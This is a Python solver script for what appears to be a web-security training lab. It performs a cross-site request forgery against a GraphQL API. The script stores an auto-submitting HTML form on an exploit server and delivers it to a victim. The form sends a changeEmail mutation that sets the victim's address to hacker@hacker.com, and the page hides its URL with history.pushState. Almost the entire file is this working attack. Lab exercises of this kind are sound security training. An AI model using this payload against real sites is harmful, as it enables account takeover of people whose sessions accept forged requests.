import requests
from urllib.parse import unquote_plus
import sys


class Solver:
    def __init__(self, lab_url, exploit_server_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.exploit_server_url = exploit_server_url if exploit_server_url.endswith('/') else exploit_server_url + '/'
        self.session = requests.Session()
        self.csrf = None

    @staticmethod
    def parsing_data(data_string):
        data_dict = {}
        for item in data_string.split('&'):
            key, value = item.split('=')
            data_dict[key] = value
        return data_dict

    def storing_and_delivering_the_exploit(self):
        payload = '''
        <form action="{}graphql/v1" method="POST">
          <input type="hidden" name="query" value="mutation&#32;&#123;changeEmail&#40;input&#58;&#123;email&#58;&quot;hacker&#64;hacker&#46;com&quot;&#125;&#41;&#123;email&#125;&#125;" />
          <input type="submit" value="Submit request" />
        </form>
        <script>
          history.pushState("", "", "/");
          document.forms[0].submit();
        </script>
        '''
        data_string = 'urlIsHttps=on&responseFile=%2Fexploit&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%3B+charset%3Dutf-8&formAction=STORE'
        data = self.parsing_data(data_string)
        for key, value in data.items():
            data[key] = unquote_plus(value)
        data['responseBody'] = payload.format(self.lab_url)
        self.session.post(self.exploit_server_url, data=data)
        data['formAction'] = 'DELIVER_TO_VICTIM'
        self.session.post(self.exploit_server_url, data=data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.storing_and_delivering_the_exploit()
        self.checking_solution()


solver = Solver(sys.argv[1], sys.argv[2])
solver.start()
